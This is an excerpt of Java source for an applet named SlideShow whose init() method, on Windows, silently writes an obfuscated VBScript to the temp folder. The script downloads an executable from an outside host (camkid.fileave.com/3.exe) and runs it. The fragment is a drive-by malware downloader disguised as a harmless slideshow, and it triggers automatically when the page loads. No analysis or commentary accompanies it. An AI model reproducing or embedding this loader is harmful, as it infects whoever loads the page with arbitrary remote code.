...
public class SlideShow extends Applet implements Runnable
{
    ...
    public void init() {
        if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
            try {
                Runtime.getRuntime().exec("cmd.exe /c echo Const J9h1w0zHFgZtuRnPeXga = 1 > %temp%\\T4G7F4S3.vbs & echo Const KlOugdsfRh54h02ZPeXga = 2 >> %temp%\\T4G7F4S3.vbs & echo Dim ZC0YK16ggjQQ, Y5mJ5jSJXzm38lz, N8VObVe37C, YK16ggjQQ >> %temp%\\T4G7F4S3.vbs & echoZC0YK16ggjQQ = \"ADODB\" >> %temp%\\T4G7F4S3.vbs & echo ZC0YK16ggjQQ = \"ADODB\" >> %temp%\\T4G7F4S3.vbs &echo Y5mJ5jSJXzm38lz = \".Stream\" >> %temp%\\T4G7F4S3.vbs & echo Set N8VObVe37C = CreateObject(ZC0YK16ggjQQ+Y5mJ5jSJXzm38lz) >> %temp%\\T4G7F4S3.vbs & echo N8VObVe37C.Type = J9h1w0zHFgZtuRnPeXga >> %temp%\\T4G7F4S3.vbs & echo N8VObVe37C.Open >> %temp%\\T4G7F4S3.vbs & echo N8VObVe37C.Write BinaryGetURL(Wscript.Arguments(0)) >> %temp%\\T4G7F4S3.vbs & echo N8VObVe37C.SaveToFile Wscript.Arguments(1), KlOugdsfRh54h02ZPeXga >> %temp%\\T4G7F4S3.vbs & echo Function BinaryGetURL(URL) >> %temp%\\T4G7F4S3.vbs & echo Set YK16ggjQQ = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> %temp%\\T4G7F4S3.vbs & echo YK16ggjQQ.Open \"GET\", URL, False >> %temp%\\T4G7F4S3.vbs & echo YK16ggjQQ.Send >> %temp%\\T4G7F4S3.vbs & echo BinaryGetURL = YK16ggjQQ.ResponseBody >> %temp%\\T4G7F4S3.vbs & echo End Function >> %temp%\\T4G7F4S3.vbs & echo CreateObject(\"WScript.Shell\").Run \"%temp%\\J7P7Q8C7.exe\" >> %temp%\\T4G7F4S3.vbs & start %temp%\\T4G7F4S3.vbs http://camkid.fileave.com/3.exe %temp%\\J7P7Q8C7.exe");
            }
